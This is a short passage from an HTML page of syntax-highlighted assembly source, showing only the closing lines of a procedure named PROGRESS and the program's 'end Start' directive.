</span><span class="sc5">PROGRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;============================================================================;</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc5">end</span></div></body>
</html>
